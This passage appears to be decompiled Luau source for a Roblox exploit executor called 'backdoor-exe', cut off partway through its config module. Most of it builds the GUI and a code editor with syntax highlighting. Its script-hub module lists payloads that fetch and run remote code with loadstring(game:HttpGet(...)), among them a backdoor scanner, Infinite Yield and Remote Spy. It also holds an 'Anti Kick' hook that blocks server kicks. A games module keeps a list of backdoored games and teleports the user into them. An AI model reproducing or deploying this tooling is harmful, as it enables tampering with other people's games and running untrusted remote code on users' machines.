v0["84"]['Text'] = [[]];
v0["84"]['Font'] = Enum.Font.SourceSans;
v0["84"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["85"] = Instance.new("UICorner", v0["84"]);
v0["86"] = Instance.new("LocalScript", v0["84"]);
v0["86"]['Name'] = [[handler]];
v0["87"] = Instance.new("ImageLabel", v0["84"]);
v0["87"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["87"]['ImageColor3'] = Color3.fromRGB(34, 34, 34);
v0["87"]['AnchorPoint'] = Vector2.new(1, 0);
v0["87"]['Image'] = [[rbxassetid://4467776646]];
v0["87"]['Size'] = UDim2.new(0, 18, 0, 18);
v0["87"]['BackgroundTransparency'] = 1;
v0["87"]['Position'] = UDim2.new(1, -5, 0, 5);
v0["88"] = Instance.new("TextButton", v0["87"]);
v0["88"]['TextSize'] = 14;
v0["88"]['TextTransparency'] = 1;
v0["88"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["88"]['TextColor3'] = Color3.fromRGB(0, 0, 0);
v0["88"]['Size'] = UDim2.new(1, 0, 1, 0);
v0["88"]['Name'] = [[Hitbox]];
v0["88"]['Text'] = [[]];
v0["88"]['Font'] = Enum.Font.SourceSans;
v0["88"]['BackgroundTransparency'] = 1;
v0["89"] = Instance.new("ImageLabel", v0["87"]);
v0["89"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["89"]['ImageColor3'] = Color3.fromRGB(171, 171, 171);
v0["89"]['AnchorPoint'] = Vector2.new(0.5, 0.5);
v0["89"]['Image'] = [[rbxassetid://3754291346]];
v0["89"]['Size'] = UDim2.new(1, -2, 1, -2);
v0["89"]['Name'] = [[icon]];
v0["89"]['BackgroundTransparency'] = 1;
v0["89"]['Position'] = UDim2.new(0.5, 0, 0.5, 0);
v0["8a"] = Instance.new("ModuleScript", v0["87"]);
v0["8a"]['Name'] = [[toggler]];
v0["8b"] = Instance.new("TextLabel", v0["84"]);
v0["8b"]['BackgroundColor3'] = Color3.fromRGB(255, 255, 255);
v0["8b"]['TextSize'] = 23;
v0["8b"]['TextColor3'] = Color3.fromRGB(233, 233, 233);
v0["8b"]['Size'] = UDim2.new(0, 80, 0, 40);
v0["8b"]['Text'] = [[Save]];
v0["8b"]['Name'] = [[Title]];
v0["8b"]['Font'] = Enum.Font.SourceSansBold;
v0["8b"]['BackgroundTransparency'] = 1;
v0["8c"] = Instance.new("ModuleScript", v0["1"]);
v0["8c"]['Name'] = [[utils]];
v0["8d"] = Instance.new("ModuleScript", v0["1"]);
v0["8d"]['Name'] = [[main]];
v0["8e"] = Instance.new("LocalScript", v0["1"]);
v0["8e"]['Name'] = [[intro]];
v0["8f"] = Instance.new("ModuleScript", v0["1"]);
v0["8f"]['Name'] = [[scripthub]];
v0["90"] = Instance.new("ModuleScript", v0["8f"]);
v0["90"]['Name'] = [[scripts]];
v0["91"] = Instance.new("ModuleScript", v0["1"]);
v0["91"]['Name'] = [[games]];
v0["92"] = Instance.new("ModuleScript", v0["1"]);
v0["92"]['Name'] = [[config]];
v0["93"] = Instance.new("ModuleScript", v0["1"]);
v0["93"]['Name'] = [[editor]];
v0["94"] = Instance.new("ModuleScript", v0["1"]);
v0["94"]['Name'] = [[magnolia]];
v0["95"] = Instance.new("LocalScript", v0["1"]);
v0["95"]['Name'] = [[secure]];
local v1158 = require;
local v1159 = {};
local function v1160(v1190)
	local v1191 = v1159[v1190];
	if v1191 then
		if not v1191.Required then
			v1191.Required = true;
			v1191.Value = v1191.Closure();
		end
		return v1191.Value;
	end
	return v1158(v1190);
end
v1159[v0["9"]] = {Closure=function()
	local v1192 = v0["9"];
	local v1193 = {keyBind=Enum.KeyCode.Home};
	local v1194 = game:GetService("UserInputService");
	local v1195 = v1192.Parent.Parent.Parent.Parent.Parent.Main;
	local function v1196(v1527)
		if (v1527 == nil) then
			v1527 = not v1195.Visible;
		end
		v1195.Visible = v1527;
	end
	v1194.InputBegan:Connect(function(v1529, v1530)
		if v1530 then
			return;
		end
		if (v1529.KeyCode == v1193.keyBind) then
			v1196();
		end
	end);
	v1192.Parent.Hitbox.MouseButton1Click:Connect(v1196);
	v1193.toggle = v1196;
	return v1193;
end};
v1159[v0["2f"]] = {Closure=function()
	local v1198 = v0["2f"];
	local v1199 = game:GetService("TextService");
	local v1200 = v1198.Parent.ScrollingFrame;
	local v1201 = v1200.SourceBox;
	local v1202 = v1200.Lines;
	local v1203 = v1160(v1198.Parent.Parent.Parent.Parent.Parent.Parent.Parent.config);
	local v1204 = v1160(v1198:WaitForChild("highlight"));
	v1204.UpdateColors(v1203.data.settings.codeColors);
	v1203.configSaved:Connect(function()
		v1204.UpdateColors(v1203.data.settings.codeColors);
	end);
	local v1205 = {};
	local v1206 = {};
	local v1207 = v1201:GetPropertyChangedSignal("Text");
	local function v1208(v1531)
		local v1532, v1533 = v1531:gsub("\n", "");
		return v1533;
	end
	local v1209 = function()
	end;
	local function v1210()
		local v1534 = v1201.Text;
		v1209();
		v1209 = v1204.Highlight(v1201, v1201.Text);
		local v1535 = "";
		for v1734 = 0, v1208(v1534) do
			v1535 = v1535 .. (v1734 + 1) .. "\n";
		end
		v1202.TextSize = v1201.TextSize;
		v1202.Font = v1201.Font;
		v1202.Text = v1535;
		local v1541 = v1199:GetTextSize(v1534, v1201.TextSize, v1201.Font, Vector2.new());
		v1200.CanvasSize = UDim2.new(0, v1541.X + v1201.TextSize + 24, 0, v1541.Y + v1201.TextSize);
	end
	task.spawn(function()
		while v1201.Parent do
			v1207:Wait();
			v1210();
		end
	end);
	return {colors=v1204.TokenColors};
end};
v1159[v0["30"]] = {Closure=function()
	local v1211 = v0["30"];
	local v1212 = v1160(v1211.lexer);
	local v1213 = v1160(v1211.Parent.Parent.Parent.Parent.Parent.Parent.Parent.Parent.config).codeColors;
	local v1214 = game:GetService("TextService");
	local v1215 = table.create(8);
	local v1216 = table.create(7);
	local v1217 = table.create(3);
	local function v1218(v1543)
		return string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(v1543, "&", "&amp;"), "<", "&lt;"), ">", "&gt;"), '\"', "&quot;"), "'", "&apos;");
	end
	local function v1219(v1544)
		return string.gsub(v1544, "\t", "	");
	end
	local function v1220(v1545)
		return string.gsub(v1545, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "");
	end
	local function v1221(v1546, v1547)
		v1547 = v1219(v1220(v1547 or v1546.Text));
		v1546.RichText = false;
		v1546.Text = v1547;
		v1546.TextXAlignment = Enum.TextXAlignment.Left;
		v1546.TextYAlignment = Enum.TextYAlignment.Top;
		v1546.BackgroundColor3 = v1215.background;
		v1546.TextColor3 = v1215.iden;
		v1546.TextTransparency = 0.5;
		local v1559 = v1546.TextSize;
		local v1560, v1561 = string.gsub(v1547, "\n", "");
		v1561 += 1
		local v1562 = v1214:GetTextSize("", v1546.TextSize, v1546.Font, Vector2.new());
		local v1563 = v1217[v1546];
		if not v1563 then
			v1563 = table.create(v1561);
			for v2938 = 1, v1561 do
				local v2939 = Instance.new("TextLabel");
				v2939.Name = "Line_" .. v2938;
				v2939.RichText = true;
				v2939.BackgroundTransparency = 1;
				v2939.TextXAlignment = Enum.TextXAlignment.Left;
				v2939.TextYAlignment = Enum.TextYAlignment.Top;
				v2939.TextColor3 = v1215.iden;
				v2939.Font = v1546.Font;
				v2939.TextSize = v1559;
				v2939.Size = UDim2.new(1, 0, 0, v1562.Y);
				v2939.Position = UDim2.fromOffset(0, v1562.Y * v1546.LineHeight * (v2938 - 1));
				v2939.Text = "";
				v2939.Parent = v1546;
				v1563[v2938] = v2939;
			end
		elseif (#v1563 < v1561) then
			for v3208 = #v1563 + 1, v1561 do
				local v3209 = Instance.new("TextLabel");
				v3209.Name = "Line_" .. v3208;
				v3209.RichText = true;
				v3209.BackgroundTransparency = 1;
				v3209.TextXAlignment = Enum.TextXAlignment.Left;
				v3209.TextYAlignment = Enum.TextYAlignment.Top;
				v3209.TextColor3 = v1215.iden;
				v3209.Font = v1546.Font;
				v3209.TextSize = v1559;
				v3209.Size = UDim2.new(1, 0, 0, v1562.Y);
				v3209.Position = UDim2.fromOffset(0, v1562.Y * v1546.LineHeight * (v3208 - 1));
				v3209.Text = "";
				v3209.Parent = v1546;
				v1563[v3208] = v3209;
			end
		elseif (#v1563 > v1561) then
			for v3293 = #v1563, v1561, -1 do
				v1563[v3293].Text = "";
			end
		end
		local v1564, v1565, v1566 = {}, 0, 1;
		for v1735, v1736 in v1212.scan(v1547) do
			local v1737 = v1215[v1735] or v1215.iden;
			local v1738 = string.split(v1218(v1736), "\n");
			for v2631, v2632 in ipairs(v1738) do
				if (v2631 > 1) then
					v1563[v1566].Text = table.concat(v1564);
					v1566 += 1
					v1565 = 0;
					table.clear(v1564);
				end
				v1565 += 1
				if ((v1737 ~= v1215.iden) and string.find(v2632, "[%S%C]")) then
					v1564[v1565] = string.format(v1216[v1735], v2632);
				else
					v1564[v1565] = v2632;
				end
			end
		end
		v1563[v1566].Text = table.concat(v1564);
		v1217[v1546] = v1563;
		local v1569;
		v1569 = v1546.AncestryChanged:Connect(function()
			if v1546.Parent then
				return;
			end
			v1217[v1546] = nil;
			v1569:Disconnect();
		end);
		return function()
			for v2633, v2634 in ipairs(v1563) do
				v2634:Destroy();
			end
			table.clear(v1563);
			v1217[v1546] = nil;
			v1569:Disconnect();
		end;
	end
	local function v1222(v1570)
		v1215.background = (v1570 and v1570.background) or Color3.fromRGB(47, 47, 47);
		v1215.iden = (v1570 and v1570.iden) or Color3.fromRGB(234, 234, 234);
		v1215.keyword = (v1570 and v1570.keyword) or Color3.fromRGB(215, 174, 255);
		v1215.builtin = (v1570 and v1570.builtin) or Color3.fromRGB(131, 206, 255);
		v1215.string = (v1570 and v1570.string) or Color3.fromRGB(196, 255, 193);
		v1215.number = (v1570 and v1570.number) or Color3.fromRGB(255, 125, 125);
		v1215.comment = (v1570 and v1570.comment) or Color3.fromRGB(140, 140, 155);
		v1215.operator = (v1570 and v1570.operator) or Color3.fromRGB(255, 239, 148);
		for v1741, v1742 in pairs(v1215) do
			v1216[v1741] = '<font color="#' .. string.format("%.2x%.2x%.2x", v1742.R * 255, v1742.G * 255, v1742.B * 255) .. '">%s</font>';
		end
		for v1744, v1745 in pairs(v1217) do
			for v2635, v2636 in ipairs(v1745) do
				v2636.TextColor3 = v1215.iden;
			end
			v1221(v1744);
		end
	end
	pcall(v1222);
	return setmetatable({UpdateColors=v1222,Highlight=v1221}, {__call=function(v1579, v1580, v1581)
		return v1221(v1580, v1581);
	end});
end};
v1159[v0["31"]] = {Closure=function()
	local v1223 = v0["31"];
	local v1224 = {};
	local v1225, v1226, v1227 = "^[%c%s]*", "[%c%s]*", "[%c%s]+";
	local v1228 = "[%z\x01-\x7F\xC2-\xF4][\x80-\xBF]+";
	local v1229 = "0x[%da-fA-F]+";
	local v1230 = "%d+%.?%d*[eE][%+%-]?%d+";
	local v1231 = "%d+[%._]?[%d_eE]*";
	local v1232 = "[:;<>/~%*%(%)%-={},%.#%^%+%%]+";
	local v1233 = "[%[%]]+";
	local v1234 = "[%a_][%w_]*";
	local v1235 = '([\'\"])%1';
	local v1236 = '([\'\"])[^\n]-([^\\]%1)';
	local v1237 = '([\'\"]).-\n';
	local v1238 = '([\'\"])[^\n]*';
	local v1239 = "%[(=*)%[.-%]%1%]";
	local v1240 = "%[=*%[.-.*";
	local v1241 = "%-%-%[(=*)%[.-%]%1%]";
	local v1242 = "%-%-%[=*%[.-.*";
	local v1243 = "%-%-.-\n";
	local v1244 = "%-%-.*";
	local v1245 = v1160(v1223.language);
	local v1246 = v1245.keyword;
	local v1247 = v1245.builtin;
	local v1248 = v1245.libraries;
	local v1249 = {{(v1225 .. v1234 .. v1226),"var"},{(v1225 .. v1229 .. v1226),"number"},{(v1225 .. v1230 .. v1226),"number"},{(v1225 .. v1231 .. v1226),"number"},{(v1225 .. v1235 .. v1226),"string"},{(v1225 .. v1236 .. v1226),"string"},{(v1225 .. v1237 .. v1226),"string"},{(v1225 .. v1238 .. v1226),"string"},{(v1225 .. v1239 .. v1226),"string"},{(v1225 .. v1240 .. v1226),"string"},{(v1225 .. v1241 .. v1226),"comment"},{(v1225 .. v1242 .. v1226),"comment"},{(v1225 .. v1243 .. v1226),"comment"},{(v1225 .. v1244 .. v1226),"comment"},{(v1225 .. v1232 .. v1226),"operator"},{(v1225 .. v1233 .. v1226),"operator"},{(v1225 .. v1228 .. v1226),"iden"},{"^.","iden"}};
	v1224.scan = function(v1582)
		v1224.finished = false;
		local v1584 = 1;
		local v1585 = #v1582;
		local v1586, v1587, v1588, v1589 = "", "", "", "";
		return function()
			if (v1584 <= v1585) then
				for v3089, v3090 in ipairs(v1249) do
					local v3091, v3092 = string.find(v1582, v3090[1], v1584);
					if v3091 then
						local v3257 = string.sub(v1582, v3091, v3092);
						v1584 = v3092 + 1;
						v1224.finished = v1584 > v1585;
						local v3259 = v3090[2];
						local v3260 = v3259;
						if (v3259 == "var") then
							local v3297 = string.gsub(v3257, v1227, "");
							if v1246[v3297] then
								v3260 = "keyword";
							elseif v1247[v3297] then
								v3260 = "builtin";
							else
								v3260 = "iden";
							end
							if (string.find(v1586, "%.[%s%c]*$") and (v1589 ~= "comment")) then
								local v3312 = string.gsub(v1587, v1227, "");
								local v3313 = v1248[v3312];
								if (v3313 and v3313[v3297] and not string.find(v1588, "%.[%s%c]*$")) then
									v3260 = "builtin";
								else
									v3260 = "iden";
								end
							end
						end
						v1588 = v1587;
						v1587 = v1586;
						v1586 = v3257;
						v1589 = v3260;
						return v3260, v3257;
					end
				end
			end
		end;
	end;
	v1224.navigator = function()
		local v1590 = {Source="",TokenCache=table.create(50),_RealIndex=0,_UserIndex=0,_ScanThread=nil};
		v1590.Destroy = function(v1746)
			v1746.Source = nil;
			v1746._RealIndex = nil;
			v1746._UserIndex = nil;
			v1746.TokenCache = nil;
			v1746._ScanThread = nil;
		end;
		v1590.SetSource = function(v1752, v1753)
			v1752.Source = v1753;
			v1752._RealIndex = 0;
			v1752._UserIndex = 0;
			table.clear(v1752.TokenCache);
			v1752._ScanThread = coroutine.create(function()
				for v2957, v2958 in v1224.scan(v1752.Source) do
					v1752._RealIndex += 1
					v1752.TokenCache[v1752._RealIndex] = {v2957,v2958};
					coroutine.yield(v2957, v2958);
				end
			end);
		end;
		v1590.Next = function()
			v1590._UserIndex += 1
			if (v1590._RealIndex >= v1590._UserIndex) then
				return table.unpack(v1590.TokenCache[v1590._UserIndex]);
			elseif (coroutine.status(v1590._ScanThread) == "dead") then
				return;
			else
				local v3227, v3228, v3229 = coroutine.resume(v1590._ScanThread);
				if (v3227 and v3228) then
					return v3228, v3229;
				else
					return;
				end
			end
		end;
		v1590.Peek = function(v1758)
			local v1759 = v1590._UserIndex + v1758;
			if (v1590._RealIndex >= v1759) then
				if (v1759 > 0) then
					return table.unpack(v1590.TokenCache[v1759]);
				else
					return;
				end
			elseif (coroutine.status(v1590._ScanThread) == "dead") then
				return;
			else
				local v3230 = v1759 - v1590._RealIndex;
				local v3231, v3232, v3233 = nil, nil, nil;
				for v3261 = 1, v3230 do
					v3231, v3232, v3233 = coroutine.resume(v1590._ScanThread);
					if not (v3231 or v3232) then
						break;
					end
				end
				return v3232, v3233;
			end
		end;
		return v1590;
	end;
	return v1224;
end};
v1159[v0["32"]] = {Closure=function()
	local v1252 = v0["32"];
	return {keyword={["and"]=true,["break"]=true,["do"]=true,["else"]=true,["elseif"]=true,["end"]=true,["false"]=true,["for"]=true,["function"]=true,["if"]=true,["in"]=true,["local"]=true,["nil"]=true,["not"]=true,["while"]=true,["or"]=true,["repeat"]=true,["return"]=true,["then"]=true,["true"]=true,self=true,["until"]=true,["continue"]=true,export=true},builtin={assert=true,collectgarbage=true,error=true,getfenv=true,getmetatable=true,ipairs=true,loadstring=true,newproxy=true,next=true,pairs=true,pcall=true,print=true,rawequal=true,rawget=true,rawset=true,select=true,setfenv=true,setmetatable=true,tonumber=true,tostring=true,type=true,unpack=true,xpcall=true,_G=true,_VERSION=true,bit32=true,coroutine=true,debug=true,math=true,os=true,string=true,table=true,utf8=true,delay=true,elapsedTime=true,gcinfo=true,require=true,settings=true,spawn=true,tick=true,time=true,typeof=true,UserSettings=true,wait=true,warn=true,ypcall=true,Enum=true,game=true,shared=true,script=true,workspace=true,plugin=true,Axes=true,BrickColor=true,CatalogSearchParams=true,CellId=true,CFrame=true,Color3=true,ColorSequence=true,ColorSequenceKeypoint=true,DateTime=true,DockWidgetPluginGuiInfo=true,Faces=true,File=true,FloatCurveKey=true,Instance=true,NumberRange=true,NumberSequence=true,NumberSequenceKeypoint=true,OverlapParams=true,PathWaypoint=true,PhysicalProperties=true,PluginDrag=true,Random=true,Ray=true,RaycastParams=true,Rect=true,Region3=true,Region3int16=true,RotationCurveKey=true,task=true,TextChatMessageProperties=true,TweenInfo=true,UDim=true,UDim2=true,Vector2=true,Vector2int16=true,Vector3=true,Vector3int16=true},libraries={math={abs=true,acos=true,asin=true,atan=true,atan2=true,ceil=true,clamp=true,cos=true,cosh=true,deg=true,exp=true,floor=true,fmod=true,frexp=true,ldexp=true,log=true,log10=true,max=true,min=true,modf=true,noise=true,pow=true,rad=true,random=true,round=true,sinh=true,sqrt=true,tan=true,tanh=true,sign=true,sin=true,randomseed=true,huge=true,pi=true},string={byte=true,char=true,find=true,format=true,gmatch=true,gsub=true,len=true,lower=true,match=true,pack=true,packsize=true,rep=true,reverse=true,split=true,sub=true,unpack=true,upper=true},table={clear=true,concat=true,foreach=true,foreachi=true,freeze=true,getn=true,insert=true,isfrozen=true,maxn=true,remove=true,sort=true,find=true,pack=true,unpack=true,move=true,create=true},debug={dumpheap=true,info=true,profilebegin=true,profileend=true,resetmemorycategory=true,setmemorycategory=true,traceback=true},os={time=true,date=true,difftime=true,clock=true},coroutine={create=true,isyieldable=true,resume=true,running=true,status=true,wrap=true,yield=true},bit32={arshift=true,band=true,bnot=true,bor=true,btest=true,bxor=true,countlz=true,countrz=true,extract=true,lrotate=true,lshift=true,replace=true,rrotate=true,rshift=true},utf8={char=true,codepoint=true,codes=true,graphemes=true,len=true,nfcnormalize=true,nfdnormalize=true,offset=true,charpattern=true},Axes={new=true},BrickColor={new=true,New=true,Random=true,Black=true,Blue=true,DarkGray=true,Gray=true,Green=true,Red=true,White=true,Yellow=true,palette=true,random=true},CatalogSearchParams={new=true},CellId={new=true},CFrame={new=true,Angles=true,fromAxisAngle=true,fromEulerAnglesXYZ=true,fromEulerAnglesYXZ=true,fromMatrix=true,fromOrientation=true,lookAt=true,identity=true},Color3={new=true,fromRGB=true,fromHSV=true,fromHex=true,toHSV=true},ColorSequence={new=true},ColorSequenceKeypoint={new=true},DateTime={now=true,fromIsoDate=true,fromLocalTime=true,fromUniversalTime=true,fromUnixTimestamp=true,fromUnixTimestampMillis=true},DockWidgetPluginGuiInfo={new=true},Faces={new=true},FloatCurveKey={new=true},Instance={new=true},NumberRange={new=true},NumberSequence={new=true},NumberSequenceKeypoint={new=true},OverlapParams={new=true},PathWaypoint={new=true},PhysicalProperties={new=true},PluginDrag={new=true},Random={new=true},Ray={new=true},RaycastParams={new=true},Rect={new=true},Region3={new=true},Region3int16={new=true},RotationCurveKey={new=true},task={wait=true,spawn=true,delay=true,defer=true,synchronize=true,desynchronize=true},TweenInfo={new=true},UDim={new=true},UDim2={new=true,fromScale=true,fromOffset=true},Vector2={new=true,one=true,zero=true,xAxis=true,yAxis=true},Vector2int16={new=true},Vector3={new=true,fromAxis=true,fromNormalId=true,FromAxis=true,FromNormalId=true,one=true,zero=true,xAxis=true,yAxis=true,zAxis=true},Vector3int16={new=true}}};
end};
v1159[v0["8a"]] = {Closure=function()
	local v1253 = v0["8a"];
	local v1254 = {keyBind=Enum.KeyCode.RightShift};
	local v1255 = game:GetService("UserInputService");
	local v1256 = v1253.Parent.Parent.Parent.Parent.Parent.Main;
	local function v1257(v1595)
		if (v1595 == nil) then
			v1595 = not v1256.Visible;
		end
		v1256.Visible = v1595;
	end
	v1255.InputBegan:Connect(function(v1597, v1598)
		if v1598 then
			return;
		end
		if (v1597.KeyCode == v1254.keyBind) then
			v1257();
		end
	end);
	v1253.Parent.Hitbox.MouseButton1Click:Connect(v1257);
	v1254.toggle = v1257;
	return v1254;
end};
v1159[v0["8c"]] = {Closure=function()
	local v1259 = v0["8c"];
	local v1260 = game:GetService("Players");
	local v1261 = v1259.Parent.Main;
	local v1262 = game:GetService("UserInputService");
	local v1263 = {move=TweenInfo.new(0.08, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),slowBackMove=TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out),expand=TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),hover=TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)};
	local v1264 = {DimMidnightBlue=Color3.fromRGB(32, 34, 37),MidnightBlue=Color3.fromRGB(47, 49, 54),LightMidnightBlue=Color3.fromRGB(54, 57, 63),WetAsphalt=Color3.fromRGB(44, 62, 80),Asphalt=Color3.fromRGB(52, 73, 94),Midnight=Color3.fromRGB(47, 53, 66),ElectricBlue=Color3.fromRGB(52, 152, 219),Blurple=Color3.fromRGB(72, 52, 212),Exodus=Color3.fromRGB(104, 109, 224),Komaru=Color3.fromRGB(48, 51, 107),DimKomaru=Color3.fromRGB(19, 15, 64),LightExodus=Color3.fromRGB(126, 214, 223),Amythest=Color3.fromRGB(155, 89, 182),Wisteria=Color3.fromRGB(142, 68, 173),Emerald=Color3.fromRGB(46, 204, 113),Carrot=Color3.fromRGB(230, 126, 34),Orange=Color3.fromRGB(243, 156, 18),SunFlower=Color3.fromRGB(241, 196, 15),Ruby=Color3.fromRGB(231, 76, 60),Rose=Color3.fromRGB(192, 57, 43),LightPink=Color3.fromRGB(255, 121, 121),DimPink=Color3.fromRGB(235, 77, 75),Pink=Color3.fromRGB(224, 86, 253),SteelPink=Color3.fromRGB(224, 86, 253),Light=Color3.fromRGB(213, 217, 255),Cloud=Color3.fromRGB(236, 240, 241),Silver=Color3.fromRGB(189, 195, 199),Concrete=Color3.fromRGB(149, 165, 166),Abestos=Color3.fromRGB(127, 140, 141)};
	local function v1265(v1599, v1600, v1601)
		local v1602;
		local v1603 = false;
		local function v1604()
			v1603 = false;
			v1601();
			if v1602 then
				v1602:Disconnect();
			end
		end
		v1261:GetPropertyChangedSignal("Visible"):Connect(function()
			if (v1261.Visible == false) then
				v1604();
			end
		end);
		v1599.MouseButton1Down:Connect(function()
			v1603 = true;
			v1600();
			v1602 = v1262.InputEnded:Connect(function(v2639)
				local v2640 = v2639.UserInputType;
				if ((v2640 == Enum.UserInputType.MouseButton1) or (v2640 == Enum.UserInputType.Touch)) then
					v1604();
				end
			end);
		end);
	end
	local v1266 = {onDownUp=v1265,tweenInfo=v1263,modernColors=v1264};
	return v1266;
end};
v1159[v0["8d"]] = {Closure=function()
	local v1267 = v0["8d"];
	local v1268 = v1267.Parent.Main.BodyClipping.Executor;
	local v1269 = v1268.InnerBody.BottomButtons;
	return {config=v1160(v1267.Parent.config),utils=v1160(v1267.Parent.utils),games=v1160(v1267.Parent.games),scripthub=v1160(v1267.Parent.scripthub),editor=v1160(v1267.Parent.editor),toggler=v1160(v1267.Parent.Main.Topbar.RightOutline.ImageLabel.toggler),ide=v1160(v1268.InnerBody.SourceBg.Source.ide),title=v1267.Parent.Main.Topbar.VersionTitle,btns={execBtn=v1269.ExecuteBtn.Hitbox}};
end};
v1159[v0["8f"]] = {Closure=function()
	local v1270 = v0["8f"];
	local v1271 = v1160(v1270:WaitForChild("scripts"));
	local v1272 = v1160(v1270.Parent.editor);
	local v1273 = v1160(v1270.Parent.config);
	local v1274 = {};
	local v1275 = 0;
	local v1276 = v1270.Parent.Main.BodyClipping.Executor.InnerBody.Scripthub.Scripts;
	local v1277 = v1276.dummy;
	v1277.Parent = nil;
	local v1279 = "rbxassetid://8150715986";
	local function v1280()
		v1276.CanvasSize = UDim2.new(0, 0, 0, (v1275 * v1277.AbsoluteSize.Y) + (v1275 * v1276.UIListLayout.Padding.Offset));
	end
	local function v1281(v1606)
		v1272.setCode(v1274[v1606]);
	end
	local function v1282(v1607, v1608, v1609)
		if v1274[v1607] then
			v1274[v1607] = v1608;
			return;
		end
		local v1610 = v1277:Clone();
		v1610.Name = v1607;
		v1610.Template.Text = v1607;
		v1610.Parent = v1276;
		if not v1609 then
			v1610.icon.Image = v1279;
			v1610.Delete:Destroy();
		else
			v1610.icon:Destroy();
			v1610.Template.Position = v1610.Template.Position - UDim2.fromOffset(12, 0);
			v1610.Delete.MouseButton1Click:Connect(function()
				v1610:Destroy();
				v1273.data.scripts[v1607] = nil;
			end);
		end
		v1610.Hitbox.MouseButton1Click:Connect(function()
			v1281(v1607);
		end);
		v1274[v1607] = v1608;
		v1275 += 1
		v1280();
	end
	local function v1283(v1615, v1616)
		for v1760, v1761 in next, v1615 do
			v1282(v1760, v1761, v1616);
		end
	end
	v1283(v1271);
	v1283(v1273.data.scripts, true);
	return {addScripts=v1283,addScript=v1282};
end};
v1159[v0["90"]] = {Closure=function()
	local v1284 = v0["90"];
	return {["Audio Logger"]="loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()",["Anti Kick"]="local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.lower\n\nif getgenv().anticheat then\n	return\nend\n\nlocal Players, StarterGui, OldNamecall = game.Players, game.StarterGui\n\ngetgenv().anticheat = {\n	Enabled = true,\n	SendNotifications = true,\n	CheckCaller = false\n}\n\nOldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(...)\n	if (getgenv().anticheat.CheckCaller and not\n		checkcaller() or true) and\n		stringlower(getnamecallmethod()) == 'kick' and\n		anticheat.Enabled then\n		return nil\n	end\n	return OldNamecall(...)\nend))\n",["Dex Explorer"]="loadstring(game:HttpGet('https://raw.githubusercontent.com/SwitchWatcher/Script/refs/heads/main/Dex_Explorer.txt'))()",["F3X Tools"]="loadstring(game:GetObjects('rbxassetid://6695644299')[1].Source)()",["Infinite Yield"]="loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()",["Lalol Backdoor"]="_G.LALOL_Hub_Backdoor_Logs_Disabled = true\nloadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/refs/heads/main/Backdoor-Scanner/script'))()",["Remote Spy"]="loadstring(game:HttpGet('https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua'))()"};
end};
v1159[v0["91"]] = {Closure=function()
	local v1285 = v0["91"];
	local v1286 = game:GetService("TweenService");
	local v1287 = game:GetService("MarketplaceService");
	local v1288 = game:GetService("TeleportService");
	local v1289 = v1160(v1285.Parent.utils);
	local v1290 = v1160(v1285.Parent.config);
	local v1291 = v1285.Parent.Main.BodyClipping.Games.InnerBody.ScrollingFrame;
	local v1292 = v1291.dummy;
	v1292.Parent = nil;
	local v1294 = v1292.Backdoors.Text;
	local v1295 = v1292.Date.Text;
	local v1296 = false;
	local v1297 = {};
	local function v1298(v1617, v1618, v1619)
		v1617 = tonumber(v1617);
		v1619 = v1619 or os.time();
		if ((type(v1618) ~= "table") or (#v1618 == 0)) then
			return;
		end
		local v1620, v1621 = pcall(v1287.GetProductInfo, v1287, v1617);
		if not v1620 then
			return;
		end
		v1290.data.games[v1617] = {backdoors=v1618,timestamp=v1619};
		local v1623 = v1297[v1617];
		if not v1623 then
			local v2644 = v1621.IconImageAssetId;
			local v2645 = v1621.Name;
			if (v2644 == 0) then
				v2644 = 3033152788;
			end
			v1623 = v1292:Clone();
			v1623.Parent = v1291;
			v1623.GameIcon.Image = "rbxassetid://" .. v2644;
			v1623.Title.Text = v2645;
		end
		local v1624 = DateTime.fromUnixTimestamp(v1619);
		v1623.Backdoors.Text = v1294:format(#v1618);
		v1623.Date.Text = v1295:format(v1624:ToIsoDate());
		v1623.Play.Hitbox.MouseLeave:Connect(function()
			v1286:Create(v1623.Play, v1289.tweenInfo.move, {Size=UDim2.new(0, 30, 1, 0)}):Play();
		end);
		v1623.Play.Hitbox.MouseEnter:Connect(function()
			v1286:Create(v1623.Play, v1289.tweenInfo.move, {Size=UDim2.new(0, 90, 1, 0)}):Play();
		end);
		v1623.Play.Hitbox.MouseButton1Click:Connect(function()
			if v1296 then
				return;
			end
			v1296 = true;
			v1288:Teleport(v1617);
		end);
		v1297[v1617] = v1623;
		v1291.info.Visible = false;
	end
	local function v1299(v1629)
		for v1762, v1763 in next, v1629 do
			v1298(v1762, v1763.backdoors, v1763.timestamp);
		end
	end
	v1299(v1290.data.games);
	return {loadGame=v1298,loadGames=v1299};
end};
v1159[v0["92"]] = {Closure=function()
	local v1300 = v0["92"];
	local v1301 = (getgenv and readfile) or function()
		return [==[]==];
	end;
	local v1302 = writefile or function()
		return true;
	end;
	local v1303 = "backdoor-exe.json";
	local v1304 = game:GetService("HttpService");
	local v1305 = game:GetService("RunService");
	local v1306 = {background=Color3.fromRGB(47, 47, 47),iden=Color3.fromRGB(234, 234, 234),keyword=Color3.fromRGB(215, 174, 255),builtin=Color3.fromRGB(131, 206, 255),string=Color3.fromRGB(196, 255, 193),number=Color3.fromRGB(255, 125, 125),comment=Color3.fromRGB(140, 140, 155),operator=Color3.fromRGB(255, 239, 148)};
	local v1307 = true;
	local function v1308()
		return {games={},scripts={},settings={codeColors=table.clone(v1306),canDebug=v1307}};
	end
	local function v1309(v1630)
		local v1631 = {};
